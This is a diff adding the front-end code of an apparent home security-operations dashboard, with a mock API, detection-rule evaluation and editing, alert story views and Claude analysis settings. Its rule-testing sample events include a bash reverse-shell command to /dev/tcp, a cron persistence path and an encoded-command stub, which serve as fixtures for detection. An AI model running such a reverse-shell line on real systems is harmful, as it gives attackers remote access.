+  if (op === "equals") return _nrm(actual, cs) === _nrm(c.value, cs);
+  if (op === "not_equals") return _nrm(actual, cs) !== _nrm(c.value, cs);
+  if (op === "in") return vals.map((x) => _nrm(x, cs)).includes(_nrm(actual, cs));
+  if (op === "not_in") return !vals.map((x) => _nrm(x, cs)).includes(_nrm(actual, cs));
+  const a = _nrm(actual, cs);
+  if (op === "contains") return a.includes(_nrm(c.value, cs));
+  if (op === "contains_any") return vals.some((x) => a.includes(_nrm(x, cs)));
+  if (op === "contains_all") return vals.every((x) => a.includes(_nrm(x, cs)));
+  if (op === "startswith") return vals.some((x) => a.startsWith(_nrm(x, cs)));
+  if (op === "endswith") return vals.some((x) => a.endsWith(_nrm(x, cs)));
+  if (op === "regex") { const fl = cs ? "" : "i"; return vals.some((p) => { try { return new RegExp(p, fl).test(String(actual == null ? "" : actual)); } catch (e) { return false; } }); }
+  if (["gt","lt","gte","lte"].includes(op)) { const an = parseFloat(actual), vn = parseFloat(c.value); if (isNaN(an) || isNaN(vn)) return false; return op === "gt" ? an > vn : op === "lt" ? an < vn : op === "gte" ? an >= vn : an <= vn; }
+  if (op === "ip_public") return _isPub(actual);
+  if (op === "ip_private") return _isPriv(actual);
+  if (op === "ip_in") return vals.some((x) => _inCidr(actual, x));
+  if (op === "ip_not_in") return !vals.some((x) => _inCidr(actual, x));
+  return false;
+}
+function ruleMatches(defn, ev) {
+  if (defn.category && ev.category !== defn.category) return false;
+  if (defn.platform && defn.platform.length && !defn.platform.includes(ev.platform)) return false;
+  const match = (defn.detection && defn.detection.match) || [];
+  if (!match.length) return false;
+  return match.every((c) => evalCond(c, ev));
+}
+function validateDef(defn, sample) {
+  const match = (defn.detection && defn.detection.match) || [];
+  if (!match.length) return { valid: false, error: "rule has empty detection.match", matched: null };
+  for (const c of match) {
+    const op = (c.op || "equals").toLowerCase();
+    if (!c.field && !["exists", "not_exists"].includes(op)) return { valid: false, error: "every condition needs a 'field'", matched: null };
+    if (op === "regex") { const vals = c.values || (c.value != null ? [c.value] : []); for (const p of vals) { try { new RegExp(p); } catch (e) { return { valid: false, error: "invalid regex " + JSON.stringify(p) + ": " + e.message, matched: null }; } } }
+  }
+  let matched = null;
+  if (sample != null) { try { matched = ruleMatches(defn, sample); } catch (e) { return { valid: false, error: "evaluation error: " + e.message, matched: null }; } }
+  return { valid: true, error: null, matched };
+}
+function slugRule(s) { s = String(s || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, ""); return s || "rule"; }
+
+// --- the stub the dashboard calls instead of fetch() ---------------------
+window.__HOMESOC_MOCK_API = function (path, opts) {
+  const method = (opts && opts.method) || "GET";
+  const url = new URL(path, "http://x");
+  const p = url.pathname;
+
+  const reply = (data) => new Promise((res) => setTimeout(() => res(data), 80));
+
+  if (p === "/api/stats")
+    return reply({ alerts: _counts(), devices: MOCK.devices.length, rules: activeRuleCount() });
+  if (p === "/api/devices")
+    return reply(MOCK.devices.map((d) => Object.assign({}, d, { online: T() - d.last_seen < 120 })));
+  if (p === "/api/settings" && method === "GET")
+    return reply(MOCK.settings);
+  if (p === "/api/settings" && method === "POST") {
+    const body = JSON.parse((opts && opts.body) || "{}");
+    if (body.claude_enabled != null) MOCK.settings.claude_enabled = body.claude_enabled;
+    if (body.claude_model) MOCK.settings.claude_model = body.claude_model;
+    if (body.claude_token) { MOCK.settings.claude_token_set = true; MOCK.settings.claude_token_masked = "sk-…" + body.claude_token.slice(-4); }
+    return reply(MOCK.settings);
+  }
+  if (p === "/api/alerts" && method === "GET") {
+    const st = url.searchParams.get("status"), sv = url.searchParams.get("severity");
+    let rows = MOCK.alerts.slice().sort((a, b) => b.ts - a.ts);
+    if (st) rows = rows.filter((a) => a.status === st);
+    if (sv) rows = rows.filter((a) => a.severity === sv);
+    return reply(rows.map(({ story, ...rest }) => rest));
+  }
+  const mStory = p.match(/^\/api\/alerts\/([^/]+)$/);
+  if (mStory && method === "GET") {
+    const a = MOCK.alerts.find((x) => x.id === mStory[1]);
+    if (!a) return Promise.reject(new Error("not found"));
+    const tl = a.story.timeline.map((e) => Object.assign({ id: Math.random().toString(36).slice(2),
+      ts_iso: _iso(e.ts) }, e));
+    return reply({
+      alert: { ...a, behavioral: a.story.behavioral || null },
+      device: MOCK.devices.find((d) => d.device_id === a.device_id) || {},
+      rule: Object.assign({ id: a.rule_id, title: a.title, severity: a.severity, mitre: a.mitre }, a.story.rule),
+      process_tree: a.story.process_tree,
+      timeline: tl,
+      behavioral: a.story.behavioral || null,
+      story_note: "Lineage and timeline are reconstructed from polled telemetry and may be partial; short-lived activity between samples can be missing. (Seeded demo data.)",
+    });
+  }
+  const mStatus = p.match(/^\/api\/alerts\/([^/]+)\/status$/);
+  if (mStatus && method === "POST") {
+    const status = JSON.parse(opts.body).status;
+    const i = MOCK.alerts.findIndex((x) => x.id === mStatus[1]);
+    if (i < 0) return Promise.reject(new Error("alert not found"));
+    if (status === "resolved") { MOCK.alerts.splice(i, 1); return reply({ ok: true, deleted: true }); }
+    MOCK.alerts[i].status = status;
+    return reply({ ok: true, deleted: false });
+  }
+  const mAnalyze = p.match(/^\/api\/alerts\/([^/]+)\/analyze$/);
+  if (mAnalyze && method === "POST") {
+    const a = MOCK.alerts.find((x) => x.id === mAnalyze[1]);
+    if (!a) return Promise.reject(new Error("not found"));
+    const text = a.story.behavioral || _genAnalysis(a);
+    a.story.behavioral = text;
+    return new Promise((res) => setTimeout(() => res({ behavioral: text }), 900));
+  }
+  if (p === "/api/rules" && method === "GET") {
+    const rules = ruleListing();
+    const by = {};
+    rules.filter((r) => r.source === "builtin" || r.enabled).forEach((r) => { by[r.severity] = (by[r.severity] || 0) + 1; });
+    return reply({ count: activeRuleCount(), by_severity: by, errors: [], rules });
+  }
+  if (p === "/api/rules/validate" && method === "POST") {
+    const b = JSON.parse(opts.body);
+    return reply(validateDef(b.definition, b.sample_event));
+  }
+  if (p === "/api/rules/custom" && method === "POST") {
+    const b = JSON.parse(opts.body), defn = Object.assign({}, b.definition);
+    let rid = slugRule(defn.id || defn.title || "");
+    if (!rid.startsWith("custom-")) rid = "custom-" + rid;
+    defn.id = rid;
+    if (ruleListing().some((r) => r.id === rid)) return Promise.reject(new Error("a rule with id '" + rid + "' already exists"));
+    const v = validateDef(defn);
+    if (!v.valid) return Promise.reject(new Error(v.error));
+    CUSTOM_RULES.push({ source: "custom", enabled: b.enabled !== false, id: rid,
+      title: defn.title || rid, severity: defn.severity || "medium", category: defn.category || null,
+      platform: defn.platform || [], mitre: defn.mitre || [], description: defn.description || "",
+      references: defn.references || [], match: defn.detection.match });
+    return reply({ id: rid });
+  }
+  const mcRule = p.match(/^\/api\/rules\/custom\/([^/]+)$/);
+  if (mcRule && method === "PUT") {
+    const b = JSON.parse(opts.body), defn = Object.assign({}, b.definition);
+    defn.id = mcRule[1];
+    const r = CUSTOM_RULES.find((x) => x.id === mcRule[1]);
+    if (!r) return Promise.reject(new Error("custom rule not found"));
+    const v = validateDef(defn);
+    if (!v.valid) return Promise.reject(new Error(v.error));
+    Object.assign(r, { title: defn.title || r.id, severity: defn.severity || "medium",
+      category: defn.category || null, platform: defn.platform || [], mitre: defn.mitre || [],
+      description: defn.description || "", references: defn.references || [],
+      match: defn.detection.match, enabled: b.enabled !== false });
+    return reply({ id: r.id });
+  }
+  if (mcRule && method === "DELETE") {
+    const i = CUSTOM_RULES.findIndex((x) => x.id === mcRule[1]);
+    if (i < 0) return Promise.reject(new Error("custom rule not found"));
+    CUSTOM_RULES.splice(i, 1);
+    return reply({ ok: true });
+  }
+  const mcTog = p.match(/^\/api\/rules\/custom\/([^/]+)\/toggle$/);
+  if (mcTog && method === "POST") {
+    const r = CUSTOM_RULES.find((x) => x.id === mcTog[1]);
+    if (!r) return Promise.reject(new Error("custom rule not found"));
+    r.enabled = JSON.parse(opts.body).enabled;
+    return reply({ id: r.id, enabled: r.enabled });
+  }
+  return Promise.reject(new Error("mock: unhandled " + method + " " + p));
+};
+
+</script>
+  <script>
+"use strict";
+
+const $ = (s) => document.querySelector(s);
+const el = (tag, cls, txt) => { const n = document.createElement(tag); if (cls) n.className = cls; if (txt != null) n.textContent = txt; return n; };
+const SEV_ORDER = ["critical", "high", "medium", "low"];
+
+const state = { alerts: [], devices: [], openAlertId: null, settings: null };
+
+async function api(path, opts) {
+  return window.__HOMESOC_MOCK_API(path, opts);
+}
+
+function fmtTime(ts) {
+  const d = new Date(ts * 1000);
+  const now = Date.now() / 1000;
+  const diff = now - ts;
+  if (diff < 60) return Math.max(0, Math.floor(diff)) + "s ago";
+  if (diff < 3600) return Math.floor(diff / 60) + "m ago";
+  if (diff < 86400) return Math.floor(diff / 3600) + "h ago";
+  return d.toLocaleDateString([], { month: "short", day: "numeric" }) + " " +
+         d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
+}
+function ago(ts) {
+  if (!ts) return "never";
+  const diff = Date.now() / 1000 - ts;
+  if (diff < 60) return Math.floor(diff) + "s";
+  if (diff < 3600) return Math.floor(diff / 60) + "m";
+  if (diff < 86400) return Math.floor(diff / 3600) + "h";
+  return Math.floor(diff / 86400) + "d";
+}
+
+/* ---------- polling ---------- */
+async function refresh() {
+  try {
+    const [stats, devices] = await Promise.all([api("/api/stats"), api("/api/devices")]);
+    const q = new URLSearchParams();
+    if ($("#f-status").value) q.set("status", $("#f-status").value);
+    if ($("#f-severity").value) q.set("severity", $("#f-severity").value);
+    const alerts = await api("/api/alerts?" + q.toString());
+
+    state.devices = devices; state.alerts = alerts;
+    setConn(true);
+    renderCounters(stats.alerts || {});
+    $("#meta-devices").textContent = stats.devices + " device" + (stats.devices === 1 ? "" : "s");
+    $("#meta-rules").textContent = stats.rules + " rules";
+    renderFleet(devices);
+    renderAlerts(alerts);
+  } catch (e) {
+    setConn(false, e.message);
+  }
+}
+
+function setConn(ok, msg) {
+  const c = $("#conn-state");
+  if (ok) { c.textContent = "live"; c.className = "brand-sub live"; }
+  else { c.textContent = "offline"; c.className = "brand-sub down"; c.title = msg || ""; }
+}
+
+function renderCounters(counts) {
+  const wrap = $("#counters"); wrap.innerHTML = "";
+  for (const sev of SEV_ORDER) {
+    const c = el("div", "counter " + sev);
+    c.appendChild(el("span", "n", String(counts[sev] || 0)));
+    c.appendChild(el("span", "lbl", sev));
+    wrap.appendChild(c);
+  }
+}
+
+function renderFleet(devices) {
+  const list = $("#fleet-list"); list.innerHTML = "";
+  if (!devices.length) { list.appendChild(el("div", "empty", "No agents enrolled yet.")); return; }
+  for (const d of devices) {
+    const row = el("div", "device");
+    row.appendChild(el("span", "dot" + (d.online ? " online" : "")));
+    const body = el("div");
+    body.appendChild(el("div", "host", d.hostname || "(unknown)"));
+    body.appendChild(el("div", "sub", `${d.platform || "?"} · seen ${ago(d.last_seen)} ago`));
+    row.appendChild(body);
+    list.appendChild(row);
+  }
+}
+
+function renderAlerts(alerts) {
+  const t = $("#alert-table"); t.innerHTML = "";
+  if (!alerts.length) { t.appendChild(el("div", "empty", "No alerts match the current filter.")); return; }
+  for (const a of alerts) {
+    const row = el("div", "alert-row" + (a.id === state.openAlertId ? " active" : ""));
+    row.tabIndex = 0;
+    row.appendChild(el("div", "sev-bar sev-" + a.severity));
+    row.appendChild(el("div", "col-time", fmtTime(a.ts)));
+
+    const title = el("div", "col-title");
+    title.appendChild(el("div", "t", a.title));
+    title.appendChild(el("div", "rid", a.rule_id));
+    row.appendChild(title);
+
+    row.appendChild(el("div", "col-host", a.hostname || "—"));
+
+    const chips = el("div", "chips");
+    (a.mitre || []).slice(0, 3).forEach((m) => chips.appendChild(el("span", "chip", m)));
+    row.appendChild(chips);
+
+    const tag = el("div", "status-tag st-" + a.status, a.status);
+    row.appendChild(tag);
+
+    const open = () => openStory(a.id);
+    row.addEventListener("click", open);
+    row.addEventListener("keydown", (e) => { if (e.key === "Enter") open(); });
+    t.appendChild(row);
+  }
+}
+
+/* ---------- alert story drawer ---------- */
+async function openStory(id) {
+  state.openAlertId = id;
+  renderAlerts(state.alerts);
+  $("#drawer-scrim").classList.add("open");
+  const drawer = $("#drawer");
+  drawer.classList.add("open"); drawer.setAttribute("aria-hidden", "false");
+  drawer.innerHTML = `<div class="section"><span class="behav-empty">Loading…</span></div>`;
+  try {
+    const data = await api("/api/alerts/" + id);
+    drawer.innerHTML = "";
+    drawer.appendChild(storyHead(data));
+    drawer.appendChild(storyActions(data));
+    drawer.appendChild(ruleSection(data));
+    drawer.appendChild(eventSection(data));
+    drawer.appendChild(treeSection(data));
+    drawer.appendChild(timelineSection(data));
+    drawer.appendChild(behavioralSection(data));
+  } catch (e) {
+    drawer.innerHTML = `<div class="section"><span class="behav-empty">Failed to load: ${e.message}</span></div>`;
+  }
+}
+function closeStory() {
+  state.openAlertId = null;
+  $("#drawer").classList.remove("open"); $("#drawer").setAttribute("aria-hidden", "true");
+  $("#drawer-scrim").classList.remove("open");
+  renderAlerts(state.alerts);
+}
+
+function storyHead(d) {
+  const a = d.alert;
+  const head = el("div", "story-head");
+  const close = el("button", "btn ghost drawer-close", "Close"); close.onclick = closeStory;
+  head.appendChild(close);
+  const row1 = el("div", "row1");
+  row1.appendChild(el("span", "sev-badge sev-" + a.severity, a.severity));
+  (a.mitre || []).forEach((m) => row1.appendChild(el("span", "chip", m)));
+  head.appendChild(row1);
+  head.appendChild(el("div", "story-title", a.title));
+  const meta = el("div", "story-meta");
+  meta.appendChild(el("span", null, "host: " + (d.device.hostname || a.hostname || "—")));
+  meta.appendChild(el("span", null, "platform: " + (d.device.platform || "?")));
+  meta.appendChild(el("span", null, fmtTime(a.ts)));
+  meta.appendChild(el("span", null, "rule: " + a.rule_id));
+  head.appendChild(meta);
+  return head;
+}
+
+function storyActions(d) {
+  const a = d.alert;
+  const wrap = el("div", "story-actions");
+  const seg = el("div", "seg");
+  ["new", "investigating", "resolved"].forEach((s) => {
+    const b = el("button", a.status === s ? "on" : "", s);
+    b.onclick = async () => {
+      try {
+        const res = await api(`/api/alerts/${a.id}/status`, {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ status: s }) });
+        if (s === "resolved" || (res && res.deleted)) {
+          closeStory(); refresh();   // resolving removes it from the dashboard
+        } else {
+          a.status = s; openStory(a.id); refresh();
+        }
+      } catch (e) { alert("Could not update status: " + e.message); }
+    };
+    seg.appendChild(b);
+  });
+  wrap.appendChild(seg);
+  return wrap;
+}
+
+function section(title) { const s = el("section", "section"); s.appendChild(el("h3", null, title)); return s; }
+
+function ruleSection(d) {
+  const s = section("Why this fired");
+  const r = d.rule;
+  if (r.description) s.appendChild(Object.assign(el("p"), { textContent: r.description, style: "margin:0 0 12px;color:var(--ink-dim);font-size:12px;line-height:1.5" }));
+  (r.match || []).forEach((c) => {
+    const line = el("div", "cond");
+    const vals = c.values ? c.values.join(", ") : (c.value != null ? String(c.value) : "");
+    line.innerHTML = `<span class="f">${c.field || ""}</span> <span class="op">${c.op || "equals"}</span> ${escapeHtml(vals)}`;
+    s.appendChild(line);
+  });
+  if (r.references && r.references.length) {
+    const refs = el("div"); refs.style.marginTop = "10px";
+    r.references.forEach((u) => {
+      const a = el("a", null, u); a.href = u; a.target = "_blank"; a.rel = "noreferrer";
+      a.style.cssText = "display:block;font-family:var(--mono);font-size:10.5px;color:var(--accent);word-break:break-all;margin-top:2px";
+      refs.appendChild(a);
+    });
+    s.appendChild(refs);
+  }
+  return s;
+}
+
+function eventSection(d) {
+  const s = section("Triggering event");
+  const pre = el("pre", "code", JSON.stringify(d.alert.event || {}, null, 2));
+  s.appendChild(pre);
+  return s;
+}
+
+function treeSection(d) {
+  const s = section("Process lineage");
+  const tree = d.process_tree || [];
+  if (!tree.length) { s.appendChild(el("div", "behav-empty", "No process lineage reconstructed for this event.")); }
+  else {
+    const t = el("div", "tree");
+    tree.forEach((n) => {
+      const node = el("div", "tnode" + (n.is_trigger ? " trigger" : ""));
+      const spine = el("div", "spine"); spine.appendChild(el("span", "knob")); spine.style.marginLeft = (n.depth * 16) + "px";
+      node.appendChild(spine);
+      const body = el("div", "body");
+      const head = el("div");
+      head.appendChild(el("span", "pname", n.process_name || "(unknown)"));
+      head.appendChild(el("span", "pids", `pid ${n.pid != null ? n.pid : "?"} · ppid ${n.ppid != null ? n.ppid : "?"}`));
+      body.appendChild(head);
+      if (n.cmdline) body.appendChild(el("div", "cmd", n.cmdline));
+      node.appendChild(body);
+      t.appendChild(node);
+    });
+    s.appendChild(t);
+  }
+  if (d.story_note) s.appendChild(el("div", "story-note", d.story_note));
+  return s;
+}
+
+function timelineSection(d) {
+  const s = section(`Timeline · ±5 min on host (${(d.timeline || []).length} events)`);
+  const tl = d.timeline || [];
+  if (!tl.length) { s.appendChild(el("div", "behav-empty", "No surrounding telemetry captured.")); return s; }
+  tl.forEach((e) => {
+    const it = el("div", "tl-item" + (e.is_trigger ? " trigger" : ""));
+    it.appendChild(el("div", "tl-time", e.ts_iso.split("T")[1].replace("Z", "")));
+    it.appendChild(el("div", "tl-cat " + (e.category || ""), `${e.category || "?"}/${e.action || ""}`));
+    it.appendChild(el("div", "tl-sum", e.summary || ""));
+    s.appendChild(it);
+  });
+  return s;
+}
+
+function behavioralSection(d) {
+  const s = section("Behavioral analysis (Claude)");
+  const out = el("div");
+  const render = (text) => { out.innerHTML = ""; out.appendChild(el("div", "behav", text)); };
+  if (d.behavioral) render(d.behavioral);
+  else out.appendChild(el("div", "behav-empty",
+    state.settings && state.settings.claude_enabled
+      ? "Not yet analyzed."
+      : "Disabled. Add a Claude token in Settings to enable."));
+  s.appendChild(out);
+
+  if (state.settings && state.settings.claude_enabled) {
+    const b = el("button", "btn", d.behavioral ? "Re-run analysis" : "Run analysis");
+    b.style.marginTop = "12px";
+    b.onclick = async () => {
+      b.disabled = true; b.textContent = "Analyzing…";
+      try {
+        const res = await api(`/api/alerts/${d.alert.id}/analyze`, { method: "POST" });
+        render(res.behavioral);
+        b.textContent = "Re-run analysis";
+      } catch (e) {
+        out.innerHTML = ""; out.appendChild(el("div", "behav-empty", "Analysis failed: " + e.message));
+        b.textContent = "Run analysis";
+      } finally { b.disabled = false; }
+    };
+    s.appendChild(b);
+  }
+  return s;
+}
+
+function escapeHtml(str) {
+  return String(str).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+}
+
+/* ---------- settings ---------- */
+async function loadSettings() {
+  try {
+    state.settings = await api("/api/settings");
+    $("#set-enabled").checked = state.settings.claude_enabled;
+    $("#set-model").value = state.settings.claude_model || "";
+    $("#token-state").textContent = state.settings.claude_token_set
+      ? "(set: " + state.settings.claude_token_masked + ")" : "(not set)";
+  } catch (e) {}
+}
+function openSettings() { loadSettings(); $("#settings-scrim").classList.add("open"); }
+function closeSettings() { $("#settings-scrim").classList.remove("open"); $("#save-state").textContent = ""; }
+
+async function saveSettings() {
+  const body = {
+    claude_enabled: $("#set-enabled").checked,
+    claude_model: $("#set-model").value.trim() || null,
+  };
+  const tok = $("#set-token").value;
+  if (tok !== "") body.claude_token = tok; // blank keeps existing
+  try {
+    state.settings = await api("/api/settings", {
+      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body),
+    });
+    $("#set-token").value = "";
+    $("#save-state").textContent = "Saved.";
+    loadSettings();
+    if (state.openAlertId) openStory(state.openAlertId);
+  } catch (e) { $("#save-state").textContent = "Error: " + e.message; }
+}
+
+/* ---------- wire up ---------- */
+$("#btn-settings").onclick = openSettings;
+$("#settings-close").onclick = closeSettings;
+$("#settings-scrim").addEventListener("click", (e) => { if (e.target === $("#settings-scrim")) closeSettings(); });
+$("#set-save").onclick = saveSettings;
+$("#drawer-scrim").onclick = closeStory;
+$("#f-status").onchange = refresh;
+$("#f-severity").onchange = refresh;
+document.addEventListener("keydown", (e) => { if (e.key === "Escape") { closeStory(); closeSettings(); } });
+
+loadSettings();
+refresh();
+setInterval(refresh, 5000);
+
+/* ===================== Rules view + custom rule editor ===================== */
+state.view = "alerts";
+state.rules = [];
+state.editing = null; // {mode: 'new'|'edit'|'view', id}
+
+const OPS = ["equals","not_equals","in","not_in","contains","contains_any","contains_all",
+  "startswith","endswith","regex","gt","lt","gte","lte","exists","not_exists",
+  "ip_public","ip_private","ip_in","ip_not_in"];
+const NO_VALUE_OPS = ["exists","not_exists","ip_public","ip_private"];
+const LIST_OPS = ["in","not_in","contains_any","contains_all","startswith","endswith","regex","ip_in","ip_not_in"];
+const SEV_RANK = { critical: 0, high: 1, medium: 2, low: 3 };
+
+const SAMPLES = {
+  process: { category: "process", platform: "linux",
+    process: { name: "bash", exe: "/bin/bash", cmdline: "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1",
+      username: "www-data", parent_name: "python3", pid: 1000, ppid: 900 } },
+  file: { category: "file", platform: "linux", action: "create",
+    file: { path: "/etc/cron.d/evil", name: "evil" } },
+  network: { category: "network", platform: "linux",
+    network: { process_name: "python3", raddr: "8.8.8.8", rport: 443, status: "ESTABLISHED", proto: "tcp" } },
+  auth: { category: "auth", platform: "linux",
+    auth: { method: "ssh", result: "failure", user: "root", source_ip: "8.8.8.8" } },
+  "": { category: "process", process: { cmdline: "example -enc AAAA" } },
+};
+
+function switchView(v) {
+  state.view = v;
+  $("#view-alerts").hidden = v !== "alerts";
+  $("#view-rules").hidden = v !== "rules";
+  $("#tab-alerts").classList.toggle("on", v === "alerts");
+  $("#tab-rules").classList.toggle("on", v === "rules");
+  if (v === "rules") loadRules();
+}
+
+async function loadRules() {
+  try {
+    const res = await api("/api/rules");
+    state.rules = res.rules || [];
+    renderRules();
+  } catch (e) {
+    $("#rules-table").innerHTML = "";
+    $("#rules-table").appendChild(el("div", "empty", "Could not load rules: " + e.message));
+  }
+}
+
+function renderRules() {
+  const t = $("#rules-table"); t.innerHTML = "";
+  let rows = state.rules.slice();
+  const src = $("#rf-source").value, sv = $("#rf-severity").value;
+  if (src) rows = rows.filter((r) => r.source === src);
+  if (sv) rows = rows.filter((r) => r.severity === sv);
+  rows.sort((a, b) =>
+    (a.source === b.source ? 0 : a.source === "custom" ? -1 : 1) ||
+    (SEV_RANK[a.severity] - SEV_RANK[b.severity]) || a.id.localeCompare(b.id));
+  if (!rows.length) { t.appendChild(el("div", "empty", "No rules match the current filter.")); return; }
+  rows.forEach((r) => t.appendChild(ruleRow(r)));
+}
+
+function ruleRow(r) {
+  const row = el("div", "rule-row");
+  row.appendChild(el("div", "sev-bar sev-" + r.severity));
+  row.appendChild(el("div", "rid", r.id));
+  row.appendChild(el("div", "rtitle", r.title));
+  row.appendChild(el("div", "rcat", r.category || "any"));
+  row.appendChild(el("div", "rplat", (r.platform && r.platform.length) ? r.platform.join(", ") : "all"));
+  const chips = el("div", "chips");
+  (r.mitre || []).slice(0, 3).forEach((m) => chips.appendChild(el("span", "chip", m)));
+  row.appendChild(chips);
+  row.appendChild(el("div", "src-tag src-" + r.source, r.source === "custom" ? "custom" : "built-in"));
+
+  const last = el("div", "rule-last");
+  const st = el("div", "rstate");
+  if (r.source === "custom") {
+    const sw = el("label", "switch");
+    const inp = document.createElement("input"); inp.type = "checkbox"; inp.checked = !!r.enabled;
+    inp.setAttribute("aria-label", "enable rule");
+    inp.addEventListener("click", (e) => { e.stopPropagation(); toggleRule(r, inp.checked); });
+    sw.appendChild(inp); sw.appendChild(el("span", "track"));
+    st.appendChild(sw); st.appendChild(el("span", "lbl", r.enabled ? "on" : "off"));
+  } else {
+    st.appendChild(el("span", "lbl", "active"));
+  }
+  last.appendChild(st);
+
+  const act = el("div", "rule-actions");
+  if (r.source === "custom") {
+    const e = el("button", "btn ghost sm", "Edit");
+    e.onclick = (ev) => { ev.stopPropagation(); openEditor(r, "edit"); };
+    const d = el("button", "btn ghost sm danger", "Delete");
+    d.onclick = (ev) => { ev.stopPropagation(); deleteRule(r); };
+    act.appendChild(e); act.appendChild(d);
+  } else {
+    const v = el("button", "btn ghost sm", "View");
+    v.onclick = (ev) => { ev.stopPropagation(); openEditor(r, "view"); };
+    act.appendChild(v);
+  }
+  last.appendChild(act);
+  row.appendChild(last);
+
+  row.addEventListener("click", () => openEditor(r, r.source === "custom" ? "edit" : "view"));
+  return row;
+}
+
+async function toggleRule(r, enabled) {
+  try {
+    await api(`/api/rules/custom/${r.id}/toggle`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ enabled }) });
+    r.enabled = enabled; renderRules(); refresh();
+  } catch (e) { alert("Toggle failed: " + e.message); loadRules(); }
+}
+
+async function deleteRule(r) {
+  if (!confirm(`Delete custom rule "${r.id}"? This cannot be undone.`)) return;
+  try {
+    await api(`/api/rules/custom/${r.id}`, { method: "DELETE" });
+    closeEditor(); loadRules(); refresh();
+  } catch (e) { alert("Delete failed: " + e.message); }
+}
+
+/* ---- editor ---- */
+function valueState(row) {
+  const op = row.querySelector(".cond-op").value;
+  const v = row.querySelector(".cond-val");
+  if (NO_VALUE_OPS.includes(op)) { v.disabled = true; v.value = ""; v.placeholder = "(no value)"; }
+  else if (LIST_OPS.includes(op)) { v.disabled = false; v.placeholder = "comma / newline separated"; }
+  else { v.disabled = false; v.placeholder = "value"; }
+}
+
+function conditionRow(cond) {
+  cond = cond || { field: "", op: "contains", value: "" };
+  const row = el("div", "re-cond");
+  const f = document.createElement("input");
+  f.className = "cond-field"; f.setAttribute("list", "re-fields");
+  f.placeholder = "field"; f.value = cond.field || "";
+  const op = document.createElement("select"); op.className = "cond-op";
+  OPS.forEach((o) => { const opt = document.createElement("option"); opt.value = o; opt.textContent = o; op.appendChild(opt); });
+  op.value = cond.op || "contains";
+  const val = document.createElement("input"); val.className = "cond-val";
+  if (cond.values) val.value = cond.values.join(", ");
+  else if (cond.value != null) val.value = String(cond.value);
+  const del = el("button", "cond-del", "×"); del.type = "button"; del.setAttribute("aria-label", "remove condition");
+  del.onclick = () => { row.remove(); updateYaml(); };
+  row.append(f, op, val, del);
+  [f, op, val].forEach((inp) => inp.addEventListener("input", updateYaml));
+  op.addEventListener("change", () => { valueState(row); updateYaml(); });
+  row.append();
+  valueState(row);
+  return row;
+}
+
+function parseVals(str) { return str.split(/[\n,]/).map((s) => s.trim()).filter(Boolean); }
+
+function buildDefinition() {
+  const match = [];
+  $("#re-conditions").querySelectorAll(".re-cond").forEach((row) => {
+    const field = row.querySelector(".cond-field").value.trim();
+    const op = row.querySelector(".cond-op").value;
+    const raw = row.querySelector(".cond-val").value;
+    if (!field && !NO_VALUE_OPS.includes(op)) return;
+    if (NO_VALUE_OPS.includes(op)) match.push({ field, op });
+    else if (LIST_OPS.includes(op)) match.push({ field, op, values: parseVals(raw) });
+    else match.push({ field, op, value: raw.trim() });
+  });
+  const defn = {
+    title: $("#re-title").value.trim(),
+    severity: $("#re-severity").value,
+    description: $("#re-desc").value.trim(),
+    detection: { match },
+  };
+  const id = $("#re-id").value.trim();
+  if (id) defn.id = id;
+  const cat = $("#re-category").value;
+  if (cat) defn.category = cat;
+  const plats = [...document.querySelectorAll(".re-plat:checked")].map((c) => c.value);
+  if (plats.length) defn.platform = plats;
+  const mitre = parseVals($("#re-mitre").value);
+  if (mitre.length) defn.mitre = mitre;
+  const refs = $("#re-refs").value.split(/\n/).map((s) => s.trim()).filter(Boolean);
+  if (refs.length) defn.references = refs;
+  return defn;
+}
+
+function yamlString(d) {
+  const q = (v) => { const s = String(v); return (s === "" || /[:#\-\s'"{}\[\]]/.test(s)) ? JSON.stringify(s) : s; };
+  const L = [];
+  L.push("id: " + (d.id || "(auto from title)"));
+  L.push("title: " + q(d.title || ""));
+  L.push("severity: " + (d.severity || "medium"));
+  if (d.category) L.push("category: " + d.category);
+  if (d.platform && d.platform.length) L.push("platform: [" + d.platform.join(", ") + "]");
+  if (d.description) L.push("description: " + q(d.description));
+  if (d.mitre && d.mitre.length) L.push("mitre: [" + d.mitre.join(", ") + "]");
+  L.push("detection:");
+  L.push("  match:");
+  (d.detection.match || []).forEach((c) => {
+    L.push("    - field: " + (c.field || ""));
+    L.push("      op: " + (c.op || "equals"));
+    if ("value" in c) L.push("      value: " + q(c.value));
+    if ("values" in c) { L.push("      values:"); c.values.forEach((v) => L.push("        - " + q(v))); }
+  });
+  if (d.references && d.references.length) { L.push("references:"); d.references.forEach((r) => L.push("  - " + r)); }
+  return L.join("\n");
+}
+
+function updateYaml() { $("#re-yaml").textContent = yamlString(buildDefinition()); }
+
+function lockForm(locked) {
+  const form = $(".re-form");
+  form.classList.toggle("locked", locked);
+  form.querySelectorAll("input, select, textarea, button").forEach((n) => { n.disabled = locked; });
+  $("#re-id").disabled = locked || state.editing.mode !== "new";
+}
+
+function openEditor(rule, mode) {
+  state.editing = { mode, id: rule ? rule.id : null };
+  $("#rule-title").textContent =
+    mode === "new" ? "New custom rule" : mode === "edit" ? "Edit custom rule" : "Built-in rule (read-only)";
+  // reset
+  $("#re-id").value = rule ? rule.id : "";
+  $("#re-title").value = rule ? (rule.title || "") : "";
+  $("#re-severity").value = rule ? (rule.severity || "high") : "high";
+  $("#re-category").value = rule ? (rule.category || "") : "";
+  document.querySelectorAll(".re-plat").forEach((c) => { c.checked = !!(rule && (rule.platform || []).includes(c.value)); });
+  $("#re-desc").value = rule ? (rule.description || "") : "";
+  $("#re-mitre").value = rule ? (rule.mitre || []).join(", ") : "";
+  $("#re-refs").value = rule ? (rule.references || []).join("\n") : "";
+  const conds = $("#re-conditions"); conds.innerHTML = "";
+  const matches = (rule && rule.match && rule.match.length) ? rule.match : [{ field: "", op: "contains", value: "" }];
+  matches.forEach((c) => conds.appendChild(conditionRow(c)));
+  $("#re-sample").value = ""; $("#re-test-out").textContent = ""; $("#re-status").textContent = "";
+
+  const isView = mode === "view";
